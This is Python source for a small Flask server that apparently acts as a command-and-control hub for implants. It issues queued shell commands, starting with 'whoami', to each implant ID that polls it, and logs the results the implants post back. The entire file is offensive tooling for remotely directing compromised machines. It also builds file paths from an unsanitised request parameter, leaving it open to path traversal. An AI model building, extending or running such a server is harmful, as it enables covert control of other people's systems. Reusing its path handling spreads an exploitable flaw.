from flask import Flask, request
import os
# export FLASK_APP=servery.py
activeIDs = []
defaultCommand = "whoami"
defaultNextCommand = ""

app = Flask(__name__)
@app.route('/', methods=['GET','POST'])
def index():
    return '404'

@app.route('/get',methods=['GET'])
def get():
    requester = request.remote_addr
    implantID = request.args['implantID']
    if implantID in activeIDs:
        r = open("connections/"+implantID+"/command.txt", "r") 
        commandNew = r.read()
        f = open("connections/"+implantID+"/log.txt", "a+")
        f.write(requester + " " + commandNew+"\n")
        with open("connections/"+implantID+"/command.txt", "w+") as f:
            f.write("")
        return commandNew
    else: 
        activeIDs.append(implantID)
        print(implantID)
        os.makedirs(os.path.dirname("connections/"+implantID+"/"), exist_ok=True)
        
        with open("connections/"+implantID+"/log.txt", "a+") as f:
            f.write(requester + " " + defaultCommand+"\n")
        with open("connections/"+implantID+"/command.txt", "w+") as w:
            w.write(defaultNextCommand)
        return defaultCommand


@app.route('/post',methods=['POST'])
def post():
    requester = request.remote_addr
    implantID = request.args['implantID']
    returned = request.form['result']
    print('RECVD: "' + returned + '"')
    f = open("connections/"+implantID+"/log.txt", "a+")  
    f.write(requester + " " + returned)
    return 'Received !' 
